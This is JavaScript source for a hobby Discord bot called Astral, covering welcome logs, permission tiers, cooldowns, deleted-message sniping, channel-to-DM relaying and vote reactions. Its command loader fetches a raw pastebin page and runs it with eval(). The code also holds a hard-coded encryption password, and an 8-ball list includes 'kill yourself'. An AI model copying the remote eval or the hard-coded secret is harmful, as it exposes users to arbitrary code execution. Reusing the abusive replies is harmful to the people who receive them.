//------Made by CoolMLGPlayer#1337------\\
//---Scripter and Developer of Astral---\\

client.on("guildMemberAdd",(m)=>{
let channel = m.guild.channels.cache.find(c => c.name === "logs");
const embed = new Discord.MessageEmbed()
.setColor("00ff99")
.setTitle("**Welcome**")
.setDescription("Welcome to **Astral** <@" + m.id + "> (" + m.user.tag + ")")
.addField("**Member Count**",m.guild.memberCount);
channel.send(embed);
});

client.on("guildMemberRemove",(m)=>{
let channel = m.guild.channels.cache.find(c => c.name === "logs");
const embed = new Discord.MessageEmbed()
.setColor("ff5555")
.setTitle("**Goodbye**")
.setDescription("<@" + m.id + "> (" + m.user.tag + ") has left **Astral**.")
.addField("**Member Count**",m.guild.memberCount);
channel.send(embed);
});

String.prototype.bold = function(){
return "**" + this + "**";
};
String.prototype.italic = function(){
return "*" + this + "*";
};

String.prototype.strike = function(){
return "~~" + this + "~~";
};

String.prototype.underline = function(){
return "__" + this + "__";
};

var vertable = [];

dataBase.setData("discordinvite","http://astral.serversided.ml/");

crypto = require('crypto');

algorithm = 'aes-256-ctr',

encrypt = function(text,password){
if(!password) password = "ZxBbHpaZzH";
  var cipher = crypto.createCipher(algorithm,password)
  var crypted = cipher.update(text,'utf8','hex')
  crypted += cipher.final('hex');
  return crypted;
}
 
decrypt = function(text,password){
if(!password) password = "ZxBbHpaZzH";
  var decipher = crypto.createDecipher(algorithm,password)
  var dec = decipher.update(text,'hex','utf8')
  dec += decipher.final('utf8');
  return dec;
}


removeItemOnce = function(arr, value) {
  var index = arr.indexOf(value);
  if (index > -1) {
    arr.splice(index, 1);
  }
  return arr;
}

setInterval(async ()=>{
client.guilds.cache.map((g)=>{
if(!g.channels.cache.find(c => c.name === 'bot-logs')){
g.channels.create("bot-logs");
};

});
},5000);
AsyncFunction = Object.getPrototypeOf(async function(){}).constructor

if(Array.prototype.equals)
    console.warn("Overriding existing Array.prototype.equals. Possible causes: New API defines the method, there's a framework conflict or you've got double inclusions in your code.");
// attach the .equals method to Array's prototype to call it on any array
Array.prototype.equals = function (array) {
    // if the other array is a falsy value, return
    if (!array)
        return false;

    // compare lengths - can save a lot of time 
    if (this.length != array.length)
        return false;

    for (var i = 0, l=this.length; i < l; i++) {
        // Check if we have nested arrays
        if (this[i] instanceof Array && array[i] instanceof Array) {
            // recurse into the nested arrays
            if (!this[i].equals(array[i]))
                return false;       
        }           
        else if (this[i] != array[i]) { 
            // Warning - two different object instances will never be equal: {x:20} != {x:20}
            return false;   
        }           
    }       
    return true;
}

// Hide method from for-in loops
Object.defineProperty(Array.prototype, "equals", {enumerable: false});
limits = [];
cooled = {};
descs = [];
perms = {};
cmds = {};

/*cmds["wl"] = {};
cmds.wl.desc = "Whitelists user";
cmds["whitelist"] = {};
cmds.whitelist.desc = "Whitelists user";
cmds["unwl"] = {};
cmds.unwl.desc = "Unwhitelists user";
cmds["unwhitelist"] = {};
cmds.unwhitelist.desc = "Unwhitelists user";
cmds["rank"] = {};
cmds.rank.desc = "Shows users rank in the group";
cmds["admin"] = {};
cmds.admin.desc = "Sets users rank in group to Admin";
cmds["developer"] = {};
cmds.developer.desc = "Sets users rank in group to Developer";
cmds["dev"] = {};
cmds.dev.desc = "Sets users rank in group to Developer";
cmds["kick"] = {};
cmds.kick.desc = "Kicks user from the server";
cmds["remove"] = {}
cmds["remove"].desc = "Removes user from the group";
cmds["portal"] = {};
cmds.portal.desc = "Shows group invite and server invite";
cmds["userinfo"] = {};
cmds.userinfo.desc = "Gets info on a roblox user";
cmds["ingroup"] = {};
cmds.ingroup.desc = "Checks if roblox user is in the group";

for (var cmd in cmds) {
if(!cmds[cmd].perm) cmds[cmd].perm = "All";
}*/

AddCmd = function(names,func,desc,perm){
names = names.split(',')
if(!perm) perm = "All";
if(perm==1) perm = "Buyer";
if(perm==2) perm = "Premium";
if(perm==3) perm = "Special";
if(perm==4) perm = "Booster";
if(perm==5) perm = "Owner";
if(typeof perm !== "string") perm = "All";
if (!Array.isArray(names)){
names = names.toLowerCase();
cmds[names] = {};
cmds[names].func = func;
cmds[names].perm = perm;
perms[names] = perm;
if (desc){

cmds[names].desc = desc

}else{
cmds[names].desc = "No description given.";
};
return;
};
names.forEach(function(name){
name = name.toLowerCase();

cmds[name] = {};
cmds[name].func = func;
cmds[name].perm = perm;

perms[name] = perm;
if (desc){
cmds[name].desc = desc;
}else{
cmds[name].desc = "No description given";
};
});
};

DelCmd = function(names){
names = names.split(',')
if (!Array.isArray(names)){
names = names.toLowerCase();
cmds[names] = false;
descs[names] = false;
delete perms[names];
return;
};
names.forEach(function(name){
name = name.toLowerCase();
cmds[name] = false;
descs[name] = false;
try{
delete perms[name];
}catch{};
});
};
AddCommand = AddCmd;
DeleteCommand = DelCmd;
UserFromID = async function(id){
return client.users.fetch(id);
};
cooldown = {};
autosnipe = {};

if(typeof dataBase.getData("auto") == "string"){
autosnipe = JSON.parse(dataBase.getData("auto"));
};
if(typeof dataBase.getData("cool") == "string"){
cooldown = JSON.parse(dataBase.getData("cool"));
};
cooldown["d"] = dataBase.getData("cooldown") || 5;
cooldown["d"] = parseInt(cooldown);
cooldown[owner.id] = 0;
Zhekoay = await UserFromID("248232475476754432");
cooldown[Zhekoay.id] = 0;
//--Commands--\\


request(`https://pastebin.com/raw/7UWhbtSR`, function (error, response, body) {
  eval(body);


let aliases = [];
let ali = [];
let total = 0;

for (var key in cmds) {
    if (key === 'length' || !cmds.hasOwnProperty(key)) continue;
if(ali[key]) continue;
total++
if(typeof cmds[key].func == "undefined") continue;
for (var alan in cmds) {
    if (alan === 'length' || !cmds.hasOwnProperty(alan)) continue;
if(cmds[alan].desc == cmds[key].desc && key !== alan){
ali[alan] = true;
};
};
};

let str = `Made by ` + owner.tag + `
Scripter and Developer of Astral
Total Number of commands: ` + total + "\n\n" + "Aliases are split by '/'" + "\n\nCommands are sorted like the following: COMMAND----DESCRIPTION----PERMISSION LEVEL\n\n";

for (var key in cmds) {
    if (key === 'length' || !cmds.hasOwnProperty(key)) continue;
if(aliases[key]){
continue;
};
str = str + "\n" + prefix +key.toUpperCase();
try{
for (var alan in cmds) {
    if (alan === 'length' || !cmds.hasOwnProperty(alan)) continue;
if(cmds[alan].func == cmds[key].func && key !== alan){
aliases[alan] = true;
str = str + "/" + alan.toUpperCase();
};
};
}catch(e){
console.log(e);
};
for (var key1 in cmds) {
    if (key1 === 'length' || !cmds.hasOwnProperty(key1)) continue;
let desc="";
if(key1 == key){
desc = cmds[key1].desc || descs[key1];
};
if(desc !== ""){
let perm = cmds[key1].perm;
if(perm !== "All"){
if(perm !== "Premium" && perm!=="Not Found") perm = perm + "s";
if(perm!=="Not Found") perm = perm + " Only";
};
if(perm == "All") perm = "Everyone";
str = str + "----" + desc + "----" + perm + "\n";
};
};
};
try{

fs.writeFile('commands.txt', str, function (err) {
  if (err) throw err;
  //console.log('Saved!');
});
}catch{}
setInterval(()=>{
refreshCmds();
},5000);

});

setInterval(()=>{

let aliases = [];
let ali = [];
let total = 0;

for (var key in cmds) {
    if (key === 'length' || !cmds.hasOwnProperty(key)) continue;
if(ali[key]) continue;
total++
if(typeof cmds[key].func == "undefined") continue;
for (var alan in cmds) {
    if (alan === 'length' || !cmds.hasOwnProperty(alan)) continue;
if(cmds[alan].desc == cmds[key].desc && key !== alan){
ali[alan] = true;
};
};
};

let str = `Made by ` + owner.tag + `
Scripter and Developer of Astral
Total Number of commands: ` + total + "\n\n" + "Aliases are split by '/'" + "\n\nCommands are sorted like the following: COMMAND----DESCRIPTION----PERMISSION LEVEL\n\n";

for (var key in cmds) {
    if (key === 'length' || !cmds.hasOwnProperty(key)) continue;
if(aliases[key]){
continue;
};
str = str + "\n" + prefix +key.toUpperCase();
try{
for (var alan in cmds) {
    if (alan === 'length' || !cmds.hasOwnProperty(alan)) continue;
if(cmds[alan].func == cmds[key].func && key !== alan){
aliases[alan] = true;
str = str + "/" + alan.toUpperCase();
};
};
}catch(e){
console.log(e);
};
for (var key1 in cmds) {
    if (key1 === 'length' || !cmds.hasOwnProperty(key1)) continue;
let desc="";
if(key1 == key){
desc = cmds[key1].desc || descs[key1];
};
if(desc !== ""){
let perm = cmds[key1].perm;
if(perm !== "All"){
if(perm !== "Premium" && perm!=="Not Found") perm = perm + "s";
if(perm!=="Not Found") perm = perm + " Only";
};
if(perm == "All") perm = "Everyone";
str = str + "----" + desc + "----" + perm + "\n";
};
};
};
try{

fs.writeFile('commands.txt', str, function (err) {
  if (err) throw err;
  //console.log('Saved!');
});
}catch{}
},5000);

let getCooldown = setInterval(()=>{
if(typeof dataBase.getData("cooldown") !== "number"){
dataBase.setData("cooldown",5);
};
cooldown["d"] = parseInt(dataBase.getData("cooldown"));
dataBase.setData("cool",JSON.stringify(cooldown));
dataBase.setData("auto",JSON.stringify(autosnipe))
},100);


client.on('message', async (message) => {
if(dataBase.getData(message.author.id+"bl")=="yes"){
return;
};
if(!message.author.bot){
if(message.channel.type !== "text" && message.author.id !== owner.id && !aguild.members.cache.get(message.author.id).isOwner()) return message.reply("no u");
};
if (!message.content.startsWith(prefix) || message.author.bot) return;
const args = message.content.slice(prefix.length).split(' ');
let command = args.shift().toLowerCase();
if(command == "help" && !args[0]) command = "cmds";
let e = args[0];
if(cmds[command]){

if(cooled[message.author.id] !== 0){

if(limits[message.author.id] && command!=="buy" && command!=="help" && command!=="cmds"){ return message.reply("You are on cooldown for " + cooled[message.author.id] + " second(s)");
};
};

try{
if(typeof cmds[command].func !== "function") return;

cooldown = JSON.parse(get("cool"));
cooled[message.author.id] = cooldown["d"];
if(typeof cooldown[message.author.id] == "number"){
cooled[message.author.id] = cooldown[message.author.id];
};

limits[message.author.id] = true
setTimeout(()=>{
limits[message.author.id] = false;
}, cooled[message.author.id] * 1000);

let interval = setInterval(()=>{
if(cooled[message.author.id] < 1){
return clearInterval(interval);
};
cooled[message.author.id] = cooled[message.author.id] - 1;
},1000);

if(message.member){
if(cmds[command].perm == "Special" && !message.member.isSpecial()){

const embed = new Discord.MessageEmbed()
            .setTitle("❗Error")
            .setColor("ff5555")
            .setDescription("You do not have permission to do this. Permission required: Special")
        return message.reply(embed);

};

if(cmds[command].perm == "Booster" && !message.member.isBooster()){

const embed = new Discord.MessageEmbed()
            .setTitle("❗Error")
            .setColor("ff5555")
            .setDescription("You do not have permission to do this. Permission required: Booster")
        return message.reply(embed);

}

if(cmds[command].perm == "Premium" && !message.member.hasPremium()){

const embed = new Discord.MessageEmbed()
            .setTitle("❗Error")
            .setColor("ff5555")
            .setDescription("You do not have permission to do this. Permission required: Premium")
        return message.reply(embed);

};

if(cmds[command].perm == "Buyer" && !message.member.isBuyer()){

const embed = new Discord.MessageEmbed()
            .setTitle("❗Error")
            .setColor("ff5555")
            .setDescription("You do not have permission to do this. Permission required: Buyer")
        return message.reply(embed);

};

if(cmds[command].perm == "Owner" && !message.member.isOwner()){

const embed = new Discord.MessageEmbed()
            .setTitle("❗Error")
            .setColor("ff5555")
            .setDescription("You do not have permission to do this. Permission required: Owner")
        return message.reply(embed);

};
};
cmds[command].func(message,args,command);


}catch(e){
if(!message.member) return;
if(message.member.isOwner()){

const embed = new Discord.MessageEmbed()
                .setTitle(e.name)
                .setColor("ff5555")
                .setDescription(e.message)
            return message.reply(embed);

}; 
console.log(e);
};
return;
}/*else if(cmds[e] && command.length < 1){

let e = args.shift().toLowerCase();
if(cooled[message.author.id] !== 0){
if(limits[message.author.id] && e!=="buy" && e!=="help" && e!=="cmds"){ return message.reply("You are on cooldown for " + cooled[message.author.id].toString() + " second(s)");
};
};
try{
if(typeof cmds[e].func !== "function") return;

cooled[message.author.id] = cooldown[message.author.id] || cooldown["d"];

limits[message.author.id] = true
setTimeout(()=>{
limits[message.author.id] = false;
}, cooled[message.author.id] * 1000);

let interval = setInterval(()=>{
if(cooled[message.author.id] == 0) return clearInterval(interval);
cooled[message.author.id] = cooled[message.author.id] - 1;
},1000);
if(message.member){
if(cmds[e].perm == "Special" && !message.member.isSpecial()){

const embed = new Discord.MessageEmbed()
            .setTitle("❗Error")
            .setColor("ff5555")
            .setDescription("You do not have permission to do this. Permission required: Special")
        return message.reply(embed);

};

if(cmds[command].perm == "Booster" && !message.member.isBooster()){

const embed = new Discord.MessageEmbed()
            .setTitle("❗Error")
            .setColor("ff5555")
            .setDescription("You do not have permission to do this. Permission required: Booster")
        return message.reply(embed);

}

if(cmds[e].perm == "Premium" && !message.member.hasPremium()){

const embed = new Discord.MessageEmbed()
            .setTitle("❗Error")
            .setColor("ff5555")
            .setDescription("You do not have permission to do this. Permission required: Premium")
        return message.reply(embed);

};

if(cmds[e].perm == "Buyer" && !message.member.isBuyer()){

const embed = new Discord.MessageEmbed()
            .setTitle("❗Error")
            .setColor("ff5555")
            .setDescription("You do not have permission to do this. Permission required: Buyer")
        return message.reply(embed);

};

if(cmds[e].perm == "Owner" && !message.member.isOwner()){

const embed = new Discord.MessageEmbed()
            .setTitle("❗Error")
            .setColor("ff5555")
            .setDescription("You do not have permission to do this. Permission required: Owner")
        return message.reply(embed);

};
};
cmds[e].func(message,args,e);

}catch(e){

if(!message.member) return;

if(message.member.isOwner()){

const embed = new Discord.MessageEmbed()
                .setTitle(e.name)
                .setColor("ff5555")
                .setDescription(e.message)
            return message.reply(embed);

};
console.log(e);
};
return;
}*/

});
botmode = false;


var res = [
	"Yes",
	"No",
	"Maybe",
	"Go fuck yourself",
	"Answer uncertain, kill yourself and try again",
        "I don't know",
]

client.on('message', message => {
if(message.author.id == owner.id && botmode == true){
const embed = new Discord.MessageEmbed()
.setColor("ff99ff")
.setDescription(message.content)
message.delete();
message.channel.send(embed);
};
if(dataBase.getData(message.author.id+"bl")=="yes"){
return;
};
if (!message.content.startsWith(prefix) || message.author.bot) return;
const args = message.content.slice(prefix.length).split(' ');
const command = args.shift().toLowerCase();
if(command=="botmode"){
if(message.author.id !== owner.id){
return;
};
if(botmode){
botmode = false;
return;
};
botmode = true;
};
});

snipemsg = [];
clearNonVerified = function(){
const guild = getChannel("<#718963106344075317>").guild;
guild.members.cache.map(m => {
if(m.user.bot) return;
if(!m.isVerified()) {
try{
        m.user.send("You did not verify please rejoin the server, "+dataBase.getData("discordinvite"));
}catch{};
       setTimeout(()=>{
        m.kick();
        },1000);
    };
});
};
client.guilds.cache.map((g)=>{
g.members.cache.map((m)=>{

m.isOwner = function(){
let e = false;
if(this.id == owner.id || this.id == Zhekoay.id || this.id == "476110417035395082"){
e = true;
};
return e;
};

m.isBooster = function(){
let e = false;
if(this.id == owner.id || this.id == Zhekoay.id || this.roles.cache.has("728676283558396034")){
e = true;
};
return e;
};

m.isSpecial = function(){
let e = false;
if(this.id == owner.id || this.id == Zhekoay.id || m.roles.cache.has("731608852923023462")){
e = true;
};
return e;
};

m.isVerified = function(){
return this.roles.cache.has("718967724184830013");
};

m.isMuted = function(){
return this.roles.cache.has("727576540182872106");
};

m.mute = function(){
return this.roles.add("727576540182872106");
};

m.unmute = function(){
return this.roles.remove("727576540182872106");
};

  m.hasPremium = function(){

let e = this.roles.cache.has("727194064432398348");
if(!e && (this.id == owner.id || this.id == Zhekoay.id)) e = true;
return e;
};
 m.isBuyer = function(){
let e = this.roles.cache.has("718965689746194493");
if(!e && (this.id == owner.id || this.id == Zhekoay.id)) e = true;
return e;
};

});
});
getUser = async function(msg,id){
let alan = await msg.guild.members.cache.get(id).then((e) =>{
user = e;
if (user.bot){
user = "y";
};
console.log(e.username);
return user;
}).catch((e) => {
return "y";
});
if (alan=="y"){
return msg.reply("invalid id");
};
return alan;
};
let verified=[];


client.on("guildCreate",(g)=>{

g.members.cache.map((m)=>{

m.isSpecial = function(){
let e = false;
if(this.id == owner.id || this.id == Zhekoay.id || m.roles.cache.has("731608852923023462")){
e = true;
};
return e;
};


m.isBooster = function(){
let e = false;
if(this.id == owner.id || this.id == Zhekoay.id || this.roles.cache.has("728676283558396034")){
e = true;
};
return e;
};

m.isOwner = function(){
let e = false;
if(this.id == owner.id || this.id == Zhekoay.id || this.id == "476110417035395082"){
e = true;
};
return e;
};

m.isVerified = function(){
return this.roles.cache.has("718967724184830013");
};

m.isMuted = function(){
return this.roles.cache.has("727576540182872106");
};

m.mute = function(){
return this.roles.add("727576540182872106");
};

m.unmute = function(){
return this.roles.remove("727576540182872106");
};

  m.hasPremium = function(){

let e = this.roles.cache.has("727194064432398348");
if(!e && (this.id == owner.id || this.id == Zhekoay.id)) e = true;
return e;
};
 m.isBuyer = function(){
let e = this.roles.cache.has("718965689746194493");
if(!e && (this.id == owner.id || this.id == Zhekoay.id)) e = true;
return e;
};

});

});

client.on("guildMemberAdd", (m) => {

m.isBooster = function(){
let e = false;
if(this.id == owner.id || this.id == Zhekoay.id || this.roles.cache.has("728676283558396034")){
e = true;
};
return e;
};

m.isSpecial = function(){
let e = false;
if(this.id == owner.id || this.id == Zhekoay.id || m.roles.cache.has("731608852923023462")){
e = true;
};
return e;
};

m.isOwner = function(){
let e = false;
if(this.id == owner.id || this.id == Zhekoay.id || this.id == "476110417035395082"){
e = true;
};
return e;
};

m.isVerified = function(){
return this.roles.cache.has("718967724184830013");
};

m.isMuted = function(){
return this.roles.cache.has("727576540182872106");
};


m.mute = function(){
return this.roles.add("727576540182872106");
};

m.unmute = function(){
return this.roles.remove("727576540182872106");
};

m.hasPremium = function(){

let e = this.roles.cache.has("727194064432398348");
if(!e && (this.id == owner.id || this.id == Zhekoay.id)) e = true;
return e;
};
 m.isBuyer = function(){
let e = this.roles.cache.has("718965689746194493");
if(!e && (this.id == owner.id || this.id == Zhekoay.id)) e = true;
return e;
};

if(m.user.bot){
return;
};
/*verified[m.user.id] = true;
vertable[m.user.id] = setTimeout(()=>{
if(!verified[m.user.id]){
return;
};
if(!m.isVerified()) {
try{
m.user.send("You did not verify please rejoin the server, " + dataBase.getData("discordinvite"));
  }catch{}
      setTimeout(()=>{
        m.kick();
        },1000);
    };
},600000)*/
});

client.on("messageUpdate",(oldm,newm)=>{
if(!newm.author) return;
if(!Zhekoay) Zhekoay = User("248232475476754432");
if(!owner) owner = User(config.ownerid);

if(newm.author.id == owner.id || newm.author.id == Zhekoay.id || newm.author.bot) return;
let oldmc = "**" + oldm.toString() + "**";
oldmc = oldmc.replace("@" + "everyone","@EVERYONE");
oldmc = oldmc.replace("@" + "here","@HERE");
let avatarurl = newm.author.displayAvatarURL({dynamic: true});
avatarurl = avatarurl.replace(".webp",".png");
let newmc = "**" + newm.toString() + "**";
newmc = newmc.replace("@" + "everyone","@EVERYONE");
newmc = newmc.replace("@" + "here","@HERE");
if(oldmc == newmc) return;
oldm.guild.channels.cache.map((c)=>{
if(c.name == "bot-logs"){
try{
const embed = new Discord.MessageEmbed()
.setColor("00ff99")
.setTitle("Message Update")
.setThumbnail(avatarurl)
.setDescription(newm.author.toString() + " edited a [**Message**](" + oldm.url + ") in " + oldm.channel.toString() + " from: '" + oldmc + "' to: '" + newmc + "'");
c.send(embed);
}catch{};
};
});
});

client.on("messageDelete",async (msg) =>{
if(msg.author.bot){
return;
};
const args = msg.content.slice(prefix.length).split(' ');
if(msg.content.startsWith("?purge ") && isNumeric(args[1])) return;
snipemsg[msg.channel.id + msg.author.id] = msg;
if(msg.author.id !== owner.id){
snipemsg[msg.channel.id] = msg;
if(autosnipe[msg.author.id]){
let reee = await UserFromID(msg.author.id);
let attachments = "";
let num = 1;
msg.attachments.map((a)=>{
attachments = attachments + "[" + a.name +"](" + a.proxyURL + ")" +"\n";
num = num + 1
});
if (attachments==""){
attachments="None";
};
let content = msg.content;
if(!msg.content || msg.content == ""){
content = "**No Message**";
};
let avatarURL = msg.author.displayAvatarURL({dynamic: true});
avatarURL = avatarURL.replace(".webp",".png");
const embed = new Discord.MessageEmbed()
.setColor("ff99ff")
.setTitle(msg.author.tag)
.setThumbnail(avatarURL)
.setDescription("**Message**: " + content + "\n**Attachments**: "+ attachments)
.addField("Message ID: ",msg.id)
.setFooter(msg.author.id)
.setTimestamp(msg.createdAt)
msg.channel.send(reee.toString() + " Deleted a message:",{embed: embed});
};
};
});
/*client.on("guildMemberRemove", (m) => {
if(m.user.bot){
return;
};
verified[m.user.id] = false;
clearTimeout(vertable[m.user.id]);
});*/
User = function(mention) {
	if (!mention) return;

	if (mention.startsWith('<@') && mention.endsWith('>')) {
		mention = mention.slice(2, -1);
         }
		if (mention.startsWith('!')) {
			mention = mention.slice(1);
		}
let gotone = false;
if(!isNumeric(mention)){
client.users.cache.map((u)=>{
if(gotone == true) return;
if(u.username.toLowerCase().substring(0,mention.length) == mention.toLowerCase()){
gotone = true;
mention = u.id;
};
if(u.tag == mention){
gotone = true;
mention = u.id;
};
});
client.users.cache.map((u)=>{
if(gotone) return;
if(u.username.toLowerCase().includes(mention.toLowerCase())){
gotone = true;
mention = u.id; 
};
});
};

		return client.users.cache.get(mention);
}

getC = function(mention) {
	if (!mention) return;

	if (mention.startsWith('<@') && mention.endsWith('>')) {
		mention = mention.slice(2, -1);
         }
		if (mention.startsWith('!')) {
			mention = mention.slice(1);
		}

		return client.channels.cache.get(mention);
};

getChannel = function(mention,msg) {
	if (!mention){ 
return msg.channel;
};
	if (mention.startsWith('<#') && mention.endsWith('>')) {
		return client.channels.cache.get(mention.slice(2, -1));
               }
		if (mention.startsWith('!')) {
			return client.channels.cache.get(mention.slice(1));
		}
if(!msg){
return console.log("invalid");
};
return msg.channel;
};

function isNumeric(num){
  return !isNaN(num)
}

sleep = async (ms) => {
    return new Promise(async(resolve, reject) => {
                   let time = new Date().getTime();
 while(true){
            if(time - ms > 0) return;
            if(time - ms <= 0){
                resolve();
                break;
            }
        }
    })
}

const status_list = [
    "online", 
    "dnd",
    "idle"
];
client.user.setStatus("online");
let current="online";

  let changeStatus = setInterval(() => {
try{
        let index = Math.floor(Math.random() * (status_list.length - 1) + 1);
       while(status_list[index]==current){
       index = Math.floor(Math.random() * (status_list.length - 1) + 1);
}
current = status_list[index];
       client.user.setStatus(status_list[index]); 
}catch{
console.log("error trying to change status");
}
}, 60000);
clearInterval(changeStatus)
reverseString = function(str) {
    var splitString = str.split("");
 
    var reverseArray = splitString.reverse();
 
    var joinArray = reverseArray.join("");
    
    return joinArray; 
}
avatar = async function(msg,id){
let user = "";
let alan = await client.users.fetch(id).then((e) =>{
user = e;
console.log(e.username);
return "a";
}).catch((e) => {
return "y";
});
if (alan == "y"){
msg.reply("invalid id");
msg.channel.stopTyping();
return;
};
let avatarURL = user.displayAvatarURL({dynamic: true});
avatarURL = avatarURL.replace(".webp",".png");
msg.channel.send("",{files: [avatarURL]});
};

msgsent = false;
msgsent1 = false;
client.on("typingStart",async (m,u)=>{
if(typeof dataBase.getData("ee") == "string" && m.id == dataBase.getData("ee") && u.id !== owner.id){

owner.dmChannel.startTyping();
let e = setInterval(()=>{
if(msgsent1){
clearInterval(e);
msgsent1 = false;
owner.dmChannel.stopTyping();
};
},100);

};
if(typeof dataBase.getData("ee") !== "string" || u.id !== owner.id || m.type !== "dm") return;
let thec = client.channels.cache.get(dataBase.getData("ee"));

thec.startTyping();
let e = setInterval(()=>{
if(msgsent){
clearInterval(e);
msgsent = false;
thec.stopTyping();
};
},100);
});
client.on("message",async(msg)=>{
if(typeof dataBase.getData("ee") !== "string" || msg.author.id == client.user.id) return;
if(msg.author.id == owner.id){
if(msg.channel.type !== "dm") return;
let thec = await client.channels.cache.get(dataBase.getData("ee"));
let em = {};
let f = []
let eee = 0;
let aaa = 0;
msg.embeds.forEach((embed)=>{

for (let key in embed) {
  em[key] = embed[key];
}

});
msg.attachments.forEach((a)=>{
f[eee] = {};
f[eee]["attachment"] = a.proxyURL;
f[eee]["name"] = a.name;
eee++
});
thec.send(msg.content,{
files: f,
});
msgsent = true;
return;
};
if(dataBase.getData("ee") !== msg.channel.id) return;
if(msg.author.id == client.user.id) return msgsent = true;
let reee = await UserFromID(msg.author.id);
msgsent1 = true
let f = []
let eee = 0
let em = {};

msg.embeds.forEach((embed)=>{

for (let key in embed) {
  em[key] = embed[key];
}

});

msg.attachments.forEach((a)=>{
f[eee] = {};
f[eee]["attachment"] = a.proxyURL;
f[eee]["name"] = a.name;
eee++
});
if(msg.embeds.length > 0){
owner.send("[" + msg.channel.toString() + "] " + msg.author.toString() + ": " + msg.content,
{
files: f,
embed: em
});
}else{

owner.send("[" + msg.channel.toString() + "] " + msg.author.toString() + ": " + msg.content,
{
files: f
});

};







/*let attachments = "";
let num = 1;
msg.attachments.map((a)=>{
attachments = attachments + "[" + a.name +"](" + a.proxyURL + ")" +"\n";
num = num + 1
});
if (attachments==""){
attachments="None";
};
let content = msg.content;
if(!msg.content || msg.content == ""){
content = "**No Message**";
};
let avatarURL = msg.author.displayAvatarURL({dynamic: true});
avatarURL = avatarURL.replace(".webp",".png");
const embed = new Discord.MessageEmbed()
.setColor("ff99ff")
.setTitle(msg.author.tag)
.setThumbnail(avatarURL)
.setDescription("**Message**: " + content + "\n**Attachments**: "+ attachments)
.addField("Message ID: ",msg.id)
.setFooter(msg.author.id)
.setTimestamp(msg.createdAt)
owner.send(reee.toString() + ":",{embed: embed});*/

});

client.on('messageReactionAdd', async (reaction, user) => {
	// When we receive a reaction we check if the reaction is partial or not
	if (reaction.partial) {
		// If the message this reaction belongs to was removed the fetching might result in an API error, which we need to handle
		try {
			await reaction.fetch();
                        await reaction.message.fetch();
		} catch (error) {
			console.log('Something went wrong when fetching the message: ', error);
			// Return as `reaction.message.author` may be undefined/null
			return;
		}
	}
if(reaction.emoji.toString() == "🥺") reaction.remove();
if (reaction.message.channel.name.toLowerCase() == "votes"){
if (reaction.emoji.id !== "733301582791442442" && reaction.emoji.id !== "733301515871191102"){
reaction.remove().catch(error => console.error('Failed to remove reactions: ', error));
};
};

	
});
client.on('message', (message) => {
try{
if(message.channel.name.toLowerCase() === "votes" && message.author.id == client.user.id){
message.react("733301582791442442");
message.react("733301515871191102");
};
if(message.channel.name.toLowerCase() == "suggestions"){
message.react("733301582791442442");
message.react("733301515871191102");
};
if(message.content=="🤔"){
try{
message.react("🤔");
}catch(e){
console.log(e);
};
};
}catch{};
});

print = function(chan,arg){
chan = getChannel(chan);
return chan.send(arg);
};
DM = function(user,arg){
user = User(user);
let e;
try{
e = user.send(arg).catch((err)=>{
throw err;
});
}catch(e){
console.log(e);
};
return e;
};
DMThenEdit = function(user,content,toedit,tim){
if(!tim || !isNumeric(tim)){
tim = 5;
};
tim = tim * 1000
return DM(user,content).then((m)=>{
setTimeout(()=>{
m.edit(toedit);
},tim);
});
};
client.on('message', message => {
if(dataBase.getData(message.author.id+"bl")=="yes"){
return;
};
if(message.guild === null && message.author.id !== owner.id) return;
if (!message.content.startsWith(prefix) || message.author.bot) return;
const args = message.content.slice(prefix.length).split(' ');
const command = args.shift().toLowerCase();
if(command=="reverse"){
if(message.author.id !== config.ownerid){
return message.reply("you do not have permission to do this");
};
let arg= args.join(' ');
print("!" + message.channel.id,reverseString(arg));
};
});
